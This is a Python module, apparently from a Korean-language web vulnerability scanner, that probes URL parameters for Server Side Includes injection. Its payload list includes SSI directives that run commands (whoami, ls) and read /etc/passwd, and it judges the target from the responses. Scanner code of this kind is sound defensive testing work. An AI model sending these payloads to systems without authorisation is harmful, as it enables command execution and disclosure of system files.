#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
modules/ssi_injection.py - SSI (Server Side Includes) 인젝션 검사
"""

import urllib.parse
from urllib.parse import urlparse, parse_qs


def test_ssi_injection(target_url, session):
    """SSI 인젝션 취약점 검사"""
    
    # SSI 인젝션 페이로드
    payloads = [
        '<!--#echo var="DATE_LOCAL" -->',
        '<!--#echo var="DOCUMENT_NAME" -->',
        '<!--#echo var="DOCUMENT_URI" -->',
        '<!--#exec cmd="ls" -->',
        '<!--#exec cmd="dir" -->',
        '<!--#exec cmd="whoami" -->',
        '<!--#include virtual="/etc/passwd" -->',
        '<!--#include file="/etc/passwd" -->',
    ]
    
    # SSI 실행 결과 지표
    ssi_indicators = [
        'root:',  # /etc/passwd 내용
        'Monday',  # DATE_LOCAL 결과
        'Tuesday',
        'Wednesday',
        'Thursday',
        'Friday',
        'Saturday',
        'Sunday',
    ]
    
    vulnerable = []
    
    try:
        parsed = urlparse(target_url)
        
        # URL에 파라미터가 없으면 검사 불가
        if not parsed.query:
            return {
                'status': '인터뷰',
                'description': 'URL에 파라미터가 없어 자동 검사가 불가능합니다',
                'details': ['GET 파라미터를 포함한 URL로 다시 테스트하세요']
            }
        
        params = parse_qs(parsed.query)
        
        # 정상 요청으로 기본 응답 확인
        base_response = session.get(target_url, timeout=10)
        base_text = base_response.text
        
        # 각 파라미터에 대해 테스트
        for param_name in params:
            for payload in payloads:
                # 테스트 파라미터 생성
                test_params = params.copy()
                test_params[param_name] = [payload]
                
                # 테스트 URL 생성
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urllib.parse.urlencode(test_params, doseq=True)}"
                
                try:
                    test_response = session.get(test_url, timeout=10)
                    response_text = test_response.text
                    
                    # 페이로드가 그대로 반영되지 않고 실행되었는지 확인
                    if payload not in response_text:
                        # SSI 실행 결과 확인
                        for indicator in ssi_indicators:
                            if indicator in response_text and indicator not in base_text:
                                vulnerable.append(
                                    f"파라미터 '{param_name}'에서 SSI 실행 가능 (페이로드: {payload[:30]}...)"
                                )
                                break
                        
                        # 응답 길이 변화 확인
                        if abs(len(response_text) - len(base_text)) > 50:
                            if param_name not in [v.split("'")[1] for v in vulnerable]:
                                vulnerable.append(
                                    f"파라미터 '{param_name}'에서 SSI 실행 가능성 (응답 변화 감지)"
                                )
                
                except Exception:
                    continue
        
        # 결과 반환
        if vulnerable:
            return {
                'status': '취약',
                'description': 'SSI 인젝션 취약점이 발견되었습니다',
                'details': list(set(vulnerable))
            }
        else:
            return {
                'status': '양호',
                'description': 'SSI 인젝션 취약점이 발견되지 않았습니다',
                'details': []
            }
    
    except Exception as e:
        return {
            'status': '인터뷰',
            'description': f'검사 중 오류 발생: {str(e)}',
            'details': []
        }
